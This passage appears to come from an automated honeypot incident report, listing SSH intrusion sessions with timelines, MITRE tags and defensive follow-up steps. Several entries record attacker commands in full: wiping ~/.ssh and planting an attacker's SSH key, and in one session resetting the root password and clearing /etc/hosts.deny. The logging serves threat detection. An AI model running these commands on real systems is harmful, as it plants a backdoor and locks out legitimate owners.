| `2026-05-12 11:15:42` | `cowrie.log.closed` |
| `2026-05-12 11:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41a556c5773c

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:15 |
| **Last Seen** | 2026-05-12 11:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:15:44` | `cowrie.session.connect` |
| `2026-05-12 11:15:44` | `cowrie.client.version` |
| `2026-05-12 11:15:44` | `cowrie.client.kex` |
| `2026-05-12 11:15:45` | `cowrie.login.success` |
| `2026-05-12 11:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e5d444a6bbf

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:18 |
| **Last Seen** | 2026-05-12 11:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:18:47` | `cowrie.session.connect` |
| `2026-05-12 11:18:47` | `cowrie.client.version` |
| `2026-05-12 11:18:47` | `cowrie.client.kex` |
| `2026-05-12 11:18:48` | `cowrie.login.success` |
| `2026-05-12 11:18:48` | `cowrie.session.params` |
| `2026-05-12 11:18:48` | `cowrie.command.input` |
| `2026-05-12 11:18:48` | `cowrie.command.failed` |
| `2026-05-12 11:18:48` | `cowrie.log.closed` |
| `2026-05-12 11:18:49` | `cowrie.session.params` |
| `2026-05-12 11:18:49` | `cowrie.command.input` |
| `2026-05-12 11:18:49` | `cowrie.session.file_download` |
| `2026-05-12 11:18:49` | `cowrie.log.closed` |
| `2026-05-12 11:18:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dca2bca6b09

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:18 |
| **Last Seen** | 2026-05-12 11:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:18:51` | `cowrie.session.connect` |
| `2026-05-12 11:18:51` | `cowrie.client.version` |
| `2026-05-12 11:18:51` | `cowrie.client.kex` |
| `2026-05-12 11:18:52` | `cowrie.login.success` |
| `2026-05-12 11:18:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61c740f0c8f1

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:19 |
| **Last Seen** | 2026-05-12 11:19 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:19:34` | `cowrie.session.connect` |
| `2026-05-12 11:19:34` | `cowrie.client.version` |
| `2026-05-12 11:19:34` | `cowrie.client.kex` |
| `2026-05-12 11:19:35` | `cowrie.login.success` |
| `2026-05-12 11:19:35` | `cowrie.session.params` |
| `2026-05-12 11:19:35` | `cowrie.command.input` |
| `2026-05-12 11:19:35` | `cowrie.command.failed` |
| `2026-05-12 11:19:35` | `cowrie.log.closed` |
| `2026-05-12 11:19:36` | `cowrie.session.params` |
| `2026-05-12 11:19:36` | `cowrie.command.input` |
| `2026-05-12 11:19:36` | `cowrie.session.file_download` |
| `2026-05-12 11:19:36` | `cowrie.log.closed` |
| `2026-05-12 11:19:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b1a81313d4f

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:19 |
| **Last Seen** | 2026-05-12 11:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:19:38` | `cowrie.session.connect` |
| `2026-05-12 11:19:38` | `cowrie.client.version` |
| `2026-05-12 11:19:38` | `cowrie.client.kex` |
| `2026-05-12 11:19:39` | `cowrie.login.success` |
| `2026-05-12 11:19:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-362ca3e2bd48

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:21 |
| **Last Seen** | 2026-05-12 11:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:21:06` | `cowrie.session.connect` |
| `2026-05-12 11:21:06` | `cowrie.client.version` |
| `2026-05-12 11:21:06` | `cowrie.client.kex` |
| `2026-05-12 11:21:07` | `cowrie.login.success` |
| `2026-05-12 11:21:07` | `cowrie.session.params` |
| `2026-05-12 11:21:07` | `cowrie.command.input` |
| `2026-05-12 11:21:07` | `cowrie.command.failed` |
| `2026-05-12 11:21:07` | `cowrie.log.closed` |
| `2026-05-12 11:21:08` | `cowrie.session.params` |
| `2026-05-12 11:21:08` | `cowrie.command.input` |
| `2026-05-12 11:21:08` | `cowrie.session.file_download` |
| `2026-05-12 11:21:08` | `cowrie.log.closed` |
| `2026-05-12 11:21:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37d8f504930d

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:21 |
| **Last Seen** | 2026-05-12 11:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:21:10` | `cowrie.session.connect` |
| `2026-05-12 11:21:10` | `cowrie.client.version` |
| `2026-05-12 11:21:10` | `cowrie.client.kex` |
| `2026-05-12 11:21:11` | `cowrie.login.success` |
| `2026-05-12 11:21:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2af207265730

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:21 |
| **Last Seen** | 2026-05-12 11:21 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:21:54` | `cowrie.session.connect` |
| `2026-05-12 11:21:54` | `cowrie.client.version` |
| `2026-05-12 11:21:54` | `cowrie.client.kex` |
| `2026-05-12 11:21:55` | `cowrie.login.success` |
| `2026-05-12 11:21:55` | `cowrie.session.params` |
| `2026-05-12 11:21:55` | `cowrie.command.input` |
| `2026-05-12 11:21:55` | `cowrie.command.failed` |
| `2026-05-12 11:21:55` | `cowrie.log.closed` |
| `2026-05-12 11:21:55` | `cowrie.session.params` |
| `2026-05-12 11:21:55` | `cowrie.command.input` |
| `2026-05-12 11:21:56` | `cowrie.session.file_download` |
| `2026-05-12 11:21:56` | `cowrie.log.closed` |
| `2026-05-12 11:21:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a679856f1696

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:21 |
| **Last Seen** | 2026-05-12 11:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:21:58` | `cowrie.session.connect` |
| `2026-05-12 11:21:58` | `cowrie.client.version` |
| `2026-05-12 11:21:58` | `cowrie.client.kex` |
| `2026-05-12 11:21:58` | `cowrie.login.success` |
| `2026-05-12 11:21:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-498e2038eeb1

| Field | Detail |
|---|---|
| **Source IP** | `124.228.34[.]69` |
| **First Seen** | 2026-05-12 11:23 |
| **Last Seen** | 2026-05-12 11:23 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:DKqvJk7c74G1"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:23:05` | `cowrie.session.connect` |
| `2026-05-12 11:23:05` | `cowrie.client.version` |
| `2026-05-12 11:23:05` | `cowrie.client.kex` |
| `2026-05-12 11:23:06` | `cowrie.login.success` |
| `2026-05-12 11:23:06` | `cowrie.session.params` |
| `2026-05-12 11:23:06` | `cowrie.command.input` |
| `2026-05-12 11:23:06` | `cowrie.command.failed` |
| `2026-05-12 11:23:06` | `cowrie.log.closed` |
| `2026-05-12 11:23:06` | `cowrie.session.params` |
| `2026-05-12 11:23:06` | `cowrie.command.input` |
| `2026-05-12 11:23:06` | `cowrie.session.file_download` |
| `2026-05-12 11:23:06` | `cowrie.log.closed` |
| `2026-05-12 11:23:23` | `cowrie.session.params` |
| `2026-05-12 11:23:23` | `cowrie.command.input` |
| `2026-05-12 11:23:23` | `cowrie.log.closed` |
| `2026-05-12 11:23:23` | `cowrie.session.params` |
| `2026-05-12 11:23:23` | `cowrie.command.input` |
| `2026-05-12 11:23:23` | `cowrie.log.closed` |
| `2026-05-12 11:23:24` | `cowrie.session.params` |
| `2026-05-12 11:23:24` | `cowrie.command.input` |
| `2026-05-12 11:23:24` | `cowrie.session.file_download` |
| `2026-05-12 11:23:24` | `cowrie.log.closed` |
| `2026-05-12 11:23:24` | `cowrie.session.params` |
| `2026-05-12 11:23:24` | `cowrie.command.input` |
| `2026-05-12 11:23:24` | `cowrie.log.closed` |
| `2026-05-12 11:23:24` | `cowrie.session.params` |
| `2026-05-12 11:23:24` | `cowrie.command.input` |
| `2026-05-12 11:23:25` | `cowrie.log.closed` |
| `2026-05-12 11:23:25` | `cowrie.session.params` |
| `2026-05-12 11:23:25` | `cowrie.command.input` |
| `2026-05-12 11:23:25` | `cowrie.command.input` |
| `2026-05-12 11:23:25` | `cowrie.log.closed` |
| `2026-05-12 11:23:25` | `cowrie.session.params` |
| `2026-05-12 11:23:25` | `cowrie.command.input` |
| `2026-05-12 11:23:25` | `cowrie.log.closed` |
| `2026-05-12 11:23:26` | `cowrie.session.params` |
| `2026-05-12 11:23:26` | `cowrie.command.input` |
| `2026-05-12 11:23:26` | `cowrie.log.closed` |
| `2026-05-12 11:23:26` | `cowrie.session.params` |
| `2026-05-12 11:23:26` | `cowrie.command.input` |
| `2026-05-12 11:23:26` | `cowrie.log.closed` |
| `2026-05-12 11:23:27` | `cowrie.session.params` |
| `2026-05-12 11:23:27` | `cowrie.command.input` |
| `2026-05-12 11:23:27` | `cowrie.log.closed` |
| `2026-05-12 11:23:27` | `cowrie.session.params` |
| `2026-05-12 11:23:27` | `cowrie.command.input` |
| `2026-05-12 11:23:27` | `cowrie.log.closed` |
| `2026-05-12 11:23:28` | `cowrie.session.params` |
| `2026-05-12 11:23:28` | `cowrie.command.input` |
| `2026-05-12 11:23:28` | `cowrie.log.closed` |
| `2026-05-12 11:23:28` | `cowrie.session.params` |
| `2026-05-12 11:23:28` | `cowrie.command.input` |
| `2026-05-12 11:23:28` | `cowrie.log.closed` |
| `2026-05-12 11:23:28` | `cowrie.session.params` |
| `2026-05-12 11:23:28` | `cowrie.command.input` |
| `2026-05-12 11:23:29` | `cowrie.log.closed` |
| `2026-05-12 11:23:29` | `cowrie.session.params` |
| `2026-05-12 11:23:29` | `cowrie.command.input` |
| `2026-05-12 11:23:29` | `cowrie.log.closed` |
| `2026-05-12 11:23:29` | `cowrie.session.params` |
| `2026-05-12 11:23:29` | `cowrie.command.input` |
| `2026-05-12 11:23:29` | `cowrie.log.closed` |
| `2026-05-12 11:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.228.34[.]69` to AbuseIPDB if not already reported
- [ ] Block `124.228.34[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6333dcc312f

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:24 |
| **Last Seen** | 2026-05-12 11:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:24:18` | `cowrie.session.connect` |
| `2026-05-12 11:24:18` | `cowrie.client.version` |
| `2026-05-12 11:24:18` | `cowrie.client.kex` |
| `2026-05-12 11:24:19` | `cowrie.login.success` |
| `2026-05-12 11:24:20` | `cowrie.session.params` |
| `2026-05-12 11:24:20` | `cowrie.command.input` |
| `2026-05-12 11:24:20` | `cowrie.command.failed` |
| `2026-05-12 11:24:20` | `cowrie.log.closed` |
| `2026-05-12 11:24:21` | `cowrie.session.params` |
| `2026-05-12 11:24:21` | `cowrie.command.input` |
| `2026-05-12 11:24:21` | `cowrie.session.file_download` |
| `2026-05-12 11:24:21` | `cowrie.log.closed` |
| `2026-05-12 11:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d127bf8db444

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-05-12 11:24 |
| **Last Seen** | 2026-05-12 11:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:24:23` | `cowrie.session.connect` |
| `2026-05-12 11:24:23` | `cowrie.client.version` |
| `2026-05-12 11:24:23` | `cowrie.client.kex` |
| `2026-05-12 11:24:24` | `cowrie.login.success` |
| `2026-05-12 11:24:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5df2a8753658

| Field | Detail |
|---|---|
| **Source IP** | `103.250.11[.]116` |
| **First Seen** | 2026-05-12 11:34 |
| **Last Seen** | 2026-05-12 11:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:34:49` | `cowrie.session.connect` |
| `2026-05-12 11:34:50` | `cowrie.client.version` |
| `2026-05-12 11:34:50` | `cowrie.client.kex` |
| `2026-05-12 11:34:50` | `cowrie.login.success` |
| `2026-05-12 11:34:50` | `cowrie.session.params` |
| `2026-05-12 11:34:50` | `cowrie.command.input` |
| `2026-05-12 11:34:50` | `cowrie.command.failed` |
| `2026-05-12 11:34:50` | `cowrie.log.closed` |
| `2026-05-12 11:34:51` | `cowrie.session.params` |
| `2026-05-12 11:34:51` | `cowrie.command.input` |
| `2026-05-12 11:34:51` | `cowrie.session.file_download` |
| `2026-05-12 11:34:51` | `cowrie.log.closed` |
| `2026-05-12 11:34:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.250.11[.]116` to AbuseIPDB if not already reported
- [ ] Block `103.250.11[.]116` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b567f91c373b

| Field | Detail |
|---|---|
| **Source IP** | `103.250.11[.]116` |
| **First Seen** | 2026-05-12 11:34 |
| **Last Seen** | 2026-05-12 11:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-12 11:34:52` | `cowrie.session.connect` |
| `2026-05-12 11:34:52` | `cowrie.client.version` |
| `2026-05-12 11:34:52` | `cowrie.client.kex` |
| `2026-05-12 11:34:53` | `cowrie.login.success` |
| `2026-05-12 11:34:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.250.11[.]116` to AbuseIPDB if not already reported
- [ ] Block `103.250.11[.]116` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be4dea25f710

| Field | Detail |
|---|---|
| **Source IP** | `189.4.3[.]135` |
| **First Seen** | 2026-05-12 11:47 |
| **Last Seen** | 2026-05-12 11:48 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
